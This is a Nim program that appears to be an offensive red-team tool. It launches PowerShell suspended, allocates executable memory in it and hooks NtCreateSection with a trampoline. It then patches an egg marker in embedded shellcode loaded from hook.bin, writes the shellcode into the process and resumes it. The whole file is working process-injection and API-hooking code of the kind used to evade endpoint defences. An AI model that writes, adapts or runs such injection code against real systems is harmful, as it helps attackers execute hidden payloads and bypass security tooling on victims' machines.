import winim
import dynlib
import Hook
import GetSyscallStub

func toByteSeq*(str: string): seq[byte] {.inline.} =
  ## Converts a string to the corresponding byte sequence.
  @(str.toOpenArrayByte(0, str.high))

var remoteProcID: DWORD
var tProcess: HANDLE
var tHandle: HANDLE

proc StartProcess(): void =
    var 
        lpSize: SIZE_T
        pi: PROCESS_INFORMATION
        ps: SECURITY_ATTRIBUTES
        si: STARTUPINFOEX
        status: WINBOOL
        tProcPath: WideCString
        ts: SECURITY_ATTRIBUTES
    
    ps.nLength = sizeof(ps).cint
    ts.nLength = sizeof(ts).cint
    si.StartupInfo.cb = sizeof(si).cint


    tProcPath = newWideCString(r"C:\windows\system32\windowspowershell\v1.0\powershell.exe")

    status = CreateProcess(
        NULL,
        cast[LPWSTR](tProcPath),
        ps,
        ts, 
        FALSE,
        CREATE_SUSPENDED or CREATE_NEW_CONSOLE or EXTENDED_STARTUPINFO_PRESENT,
        NULL,
        r"C:\Windows\system32\",
        addr si.StartupInfo,
        addr pi)

    tProcess = pi.hProcess
    remoteProcID = pi.dwProcessId
    tHandle = pi.hThread
StartProcess()

#echo "Waiting for debugger attaching"
Sleep(1000)
#var input = readLine(stdin)
#echo GetLastError()
echo "-------------------------------------------------------------------"
echo "[*] Target Process: ", remoteProcID


import dynlib

var ntdll: LibHandle = loadLib("ntdll")
if isNil(ntdll):
    echo "[X] Failed to load ntdll.dll"
    quit(1)

# The ntdll.dll base address is the same for all processes so we can use -1 as the process handle // https://www.optiv.com/insights/source-zero/blog/sacrificing-suspended-processes
var ntCreateSectionHandle: pointer = ntdll.symAddr("NtCreateSection") # equivalent of GetProcAddress()

echo "[*] Got NtCreateSection address via dynlib: ", repr(ntCreateSectionHandle)

echo "[*] Injecting Shellcode for the hook into the remote process: ", remoteProcID

const hookShellcode = slurp"hook.bin"

var hookShellcodeBytes: seq[byte] = toByteSeq(hookShellcode)

# Allocate memory in which the Shellcode will be written later on after restoring the original NtCreateSection bytes

var rPtr: LPVOID

echo "[*] pHandle: ", tProcess

var sc_size: SIZE_T = cast[SIZE_T](hookShellcodeBytes.len)
var status: NTSTATUS

status = NtAllocateVirtualMemory(
    tProcess, &rPtr, 0, &sc_size, 
    MEM_COMMIT,
    PAGE_EXECUTE_READWRITE)

if(status == 0):
    echo "[+] NtAllocateVirtualMemory success!"
else:
    echo "[-] NtAllocateVirtualMemory failed!"
    quit(1)

if(rPtr != nil):
    echo "[+] Successfully allocated remote process memory for the shellcode"
else:
    echo "[-] Memory allocation for remote process failed!"
    quit(1)

echo "-------------------------------------------------------------------"
Sleep(10000)

var buffers: HookTrampolineBuffers

var addressToHook: LPVOID = cast[LPVOID](ntCreateSectionHandle)
ntCreate_Address = cast[HANDLE](ntCreateSectionHandle)
var output: bool = false

if (ntCreate_Address == 0):
    quit(1)
    
buffers.previousBytes = cast[HANDLE](ntCreate_Address)
buffers.previousBytesSize = DWORD(sizeof(ntCreate_Address))
g_hookedNtCreate.origNtCreate = cast[typeNtCreateSection](addressToHook)
var PointerToOrigBytes: LPVOID = addr g_hookedNtCreate.ntCreateStub
copyMem(PointerToOrigBytes, addressToHook, 24)

echo "[*] Writing allocated Shellcode address ", repr(rPtr), " into Original NtCreateSection address as hook: "


output = fastTrampoline(tProcess, cast[LPVOID](addressToHook), rPtr, &buffers)
if(output):
    echo "[+] Remotely Hooked NtCreateSection: ", output
else:
    echo "[-] Remote Hook failed!"
    quit(1)

echo "-------------------------------------------------------------------"
Sleep(10000)

# We need to restore the original bytes into our shellcode egg, so that the Shellcode itself can restore the original NtCreateSection later on.
# To do that, we need to find the egg in the Shellcode and replace it with the original bytes.

echo "[*] Searching for egg in the shellcode..."

var eggIndex = 0
for i in 0 ..< hookShellcodeBytes.len:
    if (hookShellcodeBytes[i] == 0xDE) and (hookShellcodeBytes[i+1] == 0xAD) and (hookShellcodeBytes[i+2] == 0xBE) and (hookShellcodeBytes[i+3] == 0xEF) and (hookShellcodeBytes[i+4] == 0x13) and (hookShellcodeBytes[i+5] == 0x37):
        echo "[*] Found egg at index: ", i
        eggIndex = i
        break
# Write the original bytes into the egg
echo "[*] Writing original bytes into egg"
copyMem(unsafeAddr hookShellcodeBytes[eggIndex], PointerToOrigBytes, 24)
echo "[*] Done."

# Finally write the shellcode into the remote process
var bytesWritten: SIZE_T

status = NtWriteVirtualMemory(
        tProcess, 
        rPtr, 
        unsafeAddr hookShellcodeBytes[0], 
        sc_size-1, 
        addr bytesWritten);

if (status == 0):
    echo "[+] NtWriteVirtualMemory: ", status
    echo "    \\-- bytes written: ", bytesWritten
    echo ""
else:
    echo "[-] NtWriteVirtualMemory failed!"
    quit(1)


####################################################################


# Time to resume the process

echo "-------------------------------------------------------------------"
Sleep(10000)

echo "[*] Resuming the process"

echo "-------------------------------------------------------------------"
Sleep(5000)

ResumeThread(tHandle)

Sleep(1000)